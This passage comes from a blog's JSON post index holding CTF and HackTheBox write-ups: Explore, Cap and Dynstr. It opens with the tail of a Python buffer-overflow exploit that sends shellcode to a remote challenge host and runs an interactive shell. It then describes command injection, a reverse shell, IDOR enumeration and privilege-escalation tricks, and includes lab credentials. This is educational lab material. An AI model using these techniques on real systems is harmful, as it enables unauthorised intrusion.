(&quot;A&quot; * 18).encode()conn = socket.socket()conn.connect((&#39;46.101.21.240&#39;, 31877))print(conn.recv(1024))conn.send(&quot;1\\n&quot;.encode()) # Select the first option# Extract the memory addressdata = str(conn.recv(1024))addr = data.split(&quot;[&quot;)[1].split(&quot;]&quot;)[0]addr = addr[2:]print(addr)rip = unhexlify(addr)[::-1]print(&quot;%r&quot; %(rip))# The final payloadpayload = shellcode + padding + ripconn.send(payload)# Interactive shell for user commands.sleep(1)print(conn.recv(9999))while True:  command = input(&quot;Input &amp;gt; &quot;)  if command:    command += &quot;\\n&quot;    conn.send(command.encode())  print(conn.recv(1024))The above code gave me an interactive command shell on the box;ForensicsSneakyThis was a very easy forensics challenge on a .pcap file. Going through the file in wireshark showed a POST request containing the flag;Top SecretThis challenge featured packet analysis on a .pcap file captured during an FTP transfer of a PDF file. The PDF was extracted using wureshark, and it’s MD5 hash was the flag;Endurance RunThis challenge provides a windows registry file NTUSER.DAT obtained from a hacked computer. Using hivexsh, I was able to locate the flag in the registry, which wasn’t easy because hivexsh has no search feature or even tab auto-complete. I had to used hivexml to convert the whole registry file to an XML, which I then opened on a browser and used the “find” function to locate possible flags. I then used windows cmd prompt running on wine to decode the flag;Phishin ImpossibleThis challenge provides .pdf file that was found to contain an embedded file named secret_info.SettingContent-ms. The file was extracted, and found to contain the flag, which had to be joined from fragments in the powershell command;MiscBlobberThis challenge provides an obfuscated JavaScript file message.js, that uses String.fromCharCode() to load another JavaScript code. The other JavaScript code has a variable named file that was set to a base64-encoded string. Decoding the string, I got a PDF file that contained the flag;ConTextThis challenge provides an obfuscated JavaScript file. It uses a lookup table to decode strings used to reference other things, which I was able to decode using the JS console in Firefox. The JavaScript has a function named flag() that takes a signle string argument, which must be the ID of a 2D canvas in the current page. It uses the canvas to draw an image, which contains the flag for the challenge;So I setup a basic HTML page that loads the script and create a canvas, the ID of which I used to call flag() in the JS console;"
  },
  
  {
    "title": "Explore - HackTheBox",
    "url": "/posts/hackthebox/explore.html",
    "categories": "hackthebox",
    "tags": "hackthebox, android, web, es file explorer, adb, tunneling",
    "date": "2021-10-30 00:00:00 +0100",
    
    "snippet": "Explore is a box that’s first of it’s kind. It is (I think) the first android box ever released on Hack The Box. For foothold, you need to use an exploit for ES File Explorer to read arbitrary files on the device. This will lead you to an image file that contains a credential, which grants access to the box over SSH. Once in, there is an ADB service running locally on port 5555, which you can connect to using the ADB tool and elevate to root.Info  OS - Android  Difficulty - Easy  Points - 20  Release - 26/Jun/2021  IP - 10.10.10.247ReconNmap scan report for 10.10.10.247Host is up (0.25s latency).PORT      STATE    SERVICE VERSION2222/tcp  open     ssh     (protocol 2.0)| fingerprint-strings: |   NULL: |_    SSH-2.0-SSH Server - Banana Studio| ssh-hostkey: |_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)5555/tcp  filtered freeciv59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older|_http-title: Site doesn&#39;t have a title (text/plain).1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port2222-TCP:V=7.70%I=7%D=10/29%Time=617C5151%P=x86_64-pc-linux-gnu%r(NSF:ULL,24,&quot;SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n&quot;);Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Services  SSH server on port 2222  HTTP server on port 59777  Port 5555 - non-responsive.Web ServerBlank web page with no directory listing.Discovered folder init/ showing some error:Fuzzing the init/ folder didn’t reveal anything of importance. However, continuous fuzzing of the root directory with ffuf found some folders;The above marked folders are commonly found in the root of android devices. This was confirmed by making a request to a special folder found in the internal storage of all android devices;Since internal storage is the home of an android user, request to user.txt inside the /sdcard revealed the user flag;FootholdMy initial target of choice for foothold is the SSH server running on port 2222. It has been identified as SSH Server Banana Studio (net.xnano.android.sshserver) in it’s service banner, and provides a username and password login. Google searches lead me to this app;In the descriptions, it says anonymous login with username ssh and blank password is allowed, but that didn’t work on the target;Installing the SSH server on an android device showed that the ssh user need to be enabled, after which I was able to login (to the test android device) with no password;At this point, I went back to recon, and found that the service on port 59777 may actually be an ES File Explorer service after a search on exploitdb showed an exploit that targets port 59777 on android. searchsploit doesn’t have any option to search exploit contents, atleast none that I know of, so I had to use grep on the path where exploitdb store it’s exploits;Using the listFiles command, I was able to list files on the server, but I am not sure the exploit can be used to list a specific directory;Testing the other commands implemented in the exploit, the listPics command showed an interesting file;Requesting the file in a browser, I got the credential kristi:Kr1sT!5h@Rp3xPl0r3!;Using the credential, I was able to get an SSH access on the device;PrivEscQuerying for listening services showed that port 5555, which NMAP reported earlier as filtered, is running;I then setup an SSH tunnel between my attack host and the target to allow access to the service;Port 5555 is the default port used when connecting an android device to an ADB daemon over TCP. Using the ADB client installed on my host, I was able to connect to the service over TCP;Using the su command, root privileges were obtained, and the root flag was found in the /data directory;Summary  Identified running services using NMAP.  Found a web server on port 59777;          Bruteforcing with gobuster reveals a file structure similar to that of android devices.      Obtained user flag at /sdcard/user.txt since /sdcard is the home directory of android users.        Tracked down the application that provide the SSH service running on the host on port 2222, and installed it on an android device for testing.  Found an exploit targetting port 59777 on android devices in exploitdb  Obtained SSH access on the box using the credentials of kristi.  Inside the box as kristi;          Setup an SSH tunnel from my attack host to the target on port 5555, which is the port used by ADB.      Connect to the ADB service using adb installed on my host, and obtained root access using the su command.      "
  },
  
  {
    "title": "Cap - HackTheBox",
    "url": "/posts/hackthebox/cap.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, traffic analysis, python, custom exploitation, idor",
    "date": "2021-10-30 00:00:00 +0100",
    
    "snippet": "Cap is a very easy linux box. It has a web service that allows you to view network interfaces as the output of ifconfig, and the ability to briefly capture packets for 5 seconds (and download the .pcap file to your own machine). The URL to download the PCAP file contains a numeric ID, and was found to be vulnerable to an IDOR vulnerability, which I exploited to enumerate previously capture PCAPs, one of which contains a credential for an FTP service, which gave me access to the box over SSH. Once in, I analysed the source code of the web application, and found that it’s performing privileged operations (capturing traffic) without explicitly elevating privileges. The script does not have SUID permissions, which indicate the python interpreter may actually be running as root.Info  OS - Linux  Difficulty - Easy  Points - 20  Release - 05/Jun/2021  IP - 10.10.10.245ReconNMAPWappalyzerThe web app provide an option for downloading pcap files. The path in the menu is /data/8, which contains only one packet. Bruteforcing the number in the URL revealed that /data/6 contains 16 packets.In the navigation menu, there is a Network status option that showed some netstat output, and seemed to be running on the host. It also revealed a possible user named Nathan;Searching Expoit DB using searchsploit indicate the vsftpd service running on the host is vulnerable to a DoS attack. This isn’t something I’m interested in doing.Python GUNICORN Web ServerFootholdThe below URL provide a PCAP for download. On analysis, the capture packets showed many HTTP packets exchanged between my attack host and the target box. This makes sense since at the time of the download, I was using ffuf in the background to bruteforce hidden files on the web root. The PCAPs were generated after making a request to /capture.Through testing, it was found that the packet capture is initiated when the /capture path was requested, and captures packets for 5 seconds. Making the capture request while pinging the host showed some ICMP packets in the PCAP file;The exploit code provided in Exploit DB for the DoS is quite messy and creates a lot of processes that just refuse to die even after I terminated the main process;The packets captured during the DoS attack indicate the FTP server rejecting connections from our host due to too many connections made;This indicate my approach of DoSing out a connected user in hope of capturing authentication packets during reconnection probably won’t work.Every time a request was made to /capture, the web app hangs for 5 seconds (to capture the packets I guess?) and redirect user to /data/&amp;lt;n&amp;gt; (where &amp;lt;n&amp;gt; is a number) to download the captured PCAP. So I decided to bruteforce the number in hope of finding other PCAPs, and the first one yielded an FTP credential nathan:Buck3tH4TF0RM3!;Using the credential, I was able to access the box via SSH and obtain user flag;PrivEscThe nathan user is not allowed sudo access.linPEAS doesn’t yield anything interesting. However, reading the source code of the python web app revelealed an interesting block of code I can probably exploit. It contains the code that captures the packets using tcpdump;My first attempt to inject code into the app.py file above does not work for some reasons.Looking at the code file permissions, I noticed it those not have any special permissions, but manages to execute tcpdump and capture packets, which is clearly a privileged operation. The call to python3 highlighted above is also direct with no special permissions, which indicate privileges are acquired by the call to os.setuid(0). So I opened a python3 shell as nathan, and execute the os.setuid(0) command, which gave me root privileges that I used to spawn a bash shell;Summary  Identified running services with NMAP, and web technologies with Wappalyzer.  Found an option on the web app for starting a 5 second packet capture, and downloading the PCAP file generated.  Found a DoS exploit for VSFPD service running on the host.  Mistook an established SSH connection shown in the Network Status menu as a connected FTP session. Got the idea to use the DoS exploit in the hope that the client will be disconnected, and authentication traffic captured during reconnection. It failed horribly, with the FTP server rejecting connections from my IP.  Discovered a PCAP file with captured FTP authentication traffic by bruteforcing the numeric identifier in the PCAP download URL. The PCAP contains FTP login credentials for a user named nathan, which gave me access to the system via SSH.  In  the system as the user nathan via SSH;          Found the source code file of the python3 script that performs the packet capture requested through the web application.      It uses tcpdump to capture packet after a call to os.setuid(0) to obtain privileges.      Launching the python CLI shell and calling the os.setuid(0) method granted me root privileges, indicating the python3 binary likely has SUID bit enabled.      "
  },
  
  {
    "title": "Dynstr - HackTheBox",
    "url": "/posts/hackthebox/dynstr.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, web, dns, command injection, static analysis, nsupdate, custom exploitation",
    "date": "2021-10-20 00:00:00 +0100",
    
    "snippet": "Dynstr, a cool medium-rated linux box that’s all about DNS (as you probably guessed from the name). It features a web service that allows you to update DNS records on the server. One of the parameters in the request used to update DNS records is vulnerable to command injection, which I exploited to gain code execution on the box.Inside the box www-data, 2 local users were identified (dyna and bindmgr). Some log files generated by the script utility were obtained in the home directory of bindmgr. Going through the log files, I was able to recover an SSH private key for the user bindmgr, but couldn’t get access as the SSH key is mapped to a specific hostname. After bypassing this, I got access to the box as bindmgr over SSH, and exploited a custom script to gain code execution as root.InfoReconNMAP# Nmap 7.70 scan initiated Tue Oct  5 10:33:02 2021 as: nmap -sC -sV -v -oN namp.txt 10.10.10.244Increasing send delay for 10.10.10.244 from 0 to 5 due to 14 out of 46 dropped probes since last increase.Increasing send delay for 10.10.10.244 from 5 to 10 due to 13 out of 43 dropped probes since last increase.Increasing send delay for 10.10.10.244 from 320 to 640 due to 22 out of 73 dropped probes since last increase.Nmap scan report for dynstr.htb (10.10.10.244)Host is up (0.28s latency).Not shown: 997 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)| dns-nsid: |_  bind.version: 9.16.1-Ubuntu80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))| http-methods: |_  Supported Methods: POST OPTIONS HEAD GET|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Dyna DNSService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Oct  5 10:35:42 2021 -- 1 IP address (1 host up) scanned in 160.32 secondsWebWeb technologies detected by Wappalyzer;Found a credential in the  homepage dynadns:sndanyd, and an email address dns@dyna.htb;Testing the credential on SSH didn’t work, and all of the domains listed above point to the same page.Running gobuster in vhost enumeration didn’t yield anything. Directory enumeration yield one hit;The path has no index file nor directory listing. Bruteforcing with ffuf discovered another directory;It appears to be a special path as it handles requests for non-existing paths/files;This is strange to me so I decided to do some google-fu, and found this at https://www.dynu.com/en-US/Forum/ViewTopic/badauth-being-received/439;Turns out the URL is used to assign a domain name to an IP address in the DNS server.Using the above info, I crafted a request for the page using the credentials I obtained from the homepage for the user dynadns;Sending the request, I got a new response;I’m gessing the server is not allowing me to modify the root domain. So with the 3 domains found in the home page of the http://dynstr.htb, I was able to change the DNS records of their subdomains;I started listeners using netcat in both TCP and UDP modes, but didn’t get any requests. So I setup a wildcard rule *.dnsalias.htb to match all subdomains, which works, but I still didn’t get any callbacks;After resuming testing the next day, I discovered something weird: DNS updates are returning a different IP in response. The IP included in the request was the IP I was assigned the last time I connected to the HTB VPN, and the IP in the response is my current IP;Going through my previous notes, I realised I made a mistake; I have been passing the IP to map to domain name using the ip GET parameter, instead of myip. Changing the parameter worked.Running out of things to do, I started to fuzz the parameters submitted for the DNS update for injection-related vulnerabilities, and was able to get a new response;A quick check on my debian host showed nsupdate is a command line utility for DNS update;I suspect the web app is passing the hostname GET parameter without proper validation to a system call to nsupdate. If exploitable, this will give me a foothold into the server.FootholdAfter discovering a possible command injection flaw in the hostname GET parameter passed to http://dynstr.htb/nic/update, I tried to gain code execution by joining commands using linux ;, &amp;amp;&amp;amp;, and || operators. None of them worked. The web app also seems to be checking if the submitted hostname ends with a valid domain, in this case either dnsalias.htb, no-ip.htb, and dynamicdns.htb.After further testing, I was able to execute code by wrapping it in backtick characters. I got a response after 5 seconds due to the sleep 5 command;Although the above command worked, multiple simple commands to communicate with my attack host kept failing. Using the ping command for example, I noticed a delay in response that is appropriate with the number of packets sent when pinging localhost. However, attempts to ping my own host returned a response immediately saying; 911 [wrngdom: 10.14.45`www.dnsalias.htb]This make me suspicious of some kind of filter used by the web app, so I tried to base64-encode the commands. Using the base64 command-line program, I encoded a curl command to my attack host and sent it to the web app. It worked!I then used the above described method to spawn a bash reverse shell;UserInside the box as the default www-data user, I found 2 users named dyna and bindmgr. The home directory of dyna is empty, but that of bindmgr contains some files, including user flag that is not readable to us;So I downloaded all the files to my attack host for analysis.The file command-output-C62796521.txt showed the output of a failed public key authentication to an sftp service;The file strace-C62796521.txt showed the output of strace command. This is interesting because strace is used to trace all system calls made by a program.The file C62796521-debugging.timing contains some numbers;While the file C62796521-debugging.script contains terminal logs that are likely generated using the script command;This is also a very interesting file for me as the console log generated by script is very neat and will be easier to analyse. Going through the file, I noticed multiple outputs of strace. Towards the end of the file, the user bindmgr attempted a public key SSH authentication. Since strace was executed during the authentication, it captured the system call used by the SSH client to load the SSH private key of the user bindmgr from disk;I extracted the key to id_rsa on my attack host and tried to access the user account of bindmgr, but I got a prompt for password despite passing the private key. Enabling verbose output showed that the public key authentication failed.I used scriptreplay and gave it the timing file and the typescript to make sense of what the user was actually doing. It showed the user bindmgr attempting to download a file from an SSH server using sFTP;Looking at the authorized_keys file in bindmgr’s SSH directory, I noticed that access is allowed only to hosts with the name *.infra.dyna.htb;This means I need to map my IP to match the above hostname. Using the nsupdate utility and the keys inside /etc/bin, I was able to gain SSH access after lots of googling about nsupdate;PrivEscUser can run a script as root using sudo;The script checks for the file .version in the current working directory. If it does not exist, it aborts. If it does, it compares it’s value against the .version file in /etc/bind/named.bindmgr. If the value in the first .version file is higher, it copies the version file and any other file in the working directory to /etc/bind/named.bindmgr;I noticed the call to cp uses relative path. So I tried to gain root by tampering with the $PATH variable to execute a cp script of my own, which failed;Since the copy operation is done as root, and all files are included using a wildcard *, I was able to gain root by copying the bash binary and giving it the SUID permission, then have the permission retained after the copy operation by creating a file with the name --preserve=mode, which the cp command will interpret as a special argument;Summary  Found a DNS, SSH, and web service running on the host using nmap  Found a credential on the homepage of the web service with username dynadns and password sndanyd  Discovered /nic/update by bruteforcing with ffuf and gobuster. Requesting the path showed badauth, but passing the credentials discovered previously gives a nochg &amp;lt;user-IP&amp;gt; response.  Some googling showed that /nic/update is used to update DNS records, and takes the parameters hostname, myip, and location. The parameter hostname was found to be vulnerable to command injection through fuzzing after a response mentioning nsupdate, which is a command-line tool for updating DNS records, was returned. Base64-encoding allows for more complex commands to be injected. This was exploited to gain a foothold into the box as the web user www-data.  Inside the box as www-data;          Two users, binmgr, and dyna, were discovered. The home directory of dyna is practically empty, while that of bindmgr contains the user flag which is not readable, and some interesting files.      The files obtained from the home of bindmgr include console logs generated by the linux script utility. The user attempted an SSH public key authentication while running strace, which prints out lots of data on all system calls, which include the contents of the user’s private key as it was read from disk.      Attempts to access the account bindmgr using the extracted SSH private key failed. Checking /home/bindmgr/.ssh/authorized_keys showed that access is limited to hosts that match *.infra.dyna.htb. Using the key file at /etc/bind/infra.key and the nsupdate tool, I mapped my IP to hacker.infra.dyna.htb, which satisfied the SSH requirement, and gave me access to the bindmgr account, and the user flag.        Inside the box as bindmgr;          The user has permission to run /usr/local/bin/bindmgr.sh using sudo.      Attempt to hijack the relative call to cp made by the script through path tampering failed.      Since a wildcard * was used in the cp command to copy all files, creating a SUID bash binary, and an empty file named --preserve=mode, which will be matched by the wildcard, and be interpreted by the cp command as a special argument used to preserve permissions during copy operations, resulted in the copied binary being created with the ownership changed to root but the SUID bits retained, which gave me root access to the box.      "
  }
  
]
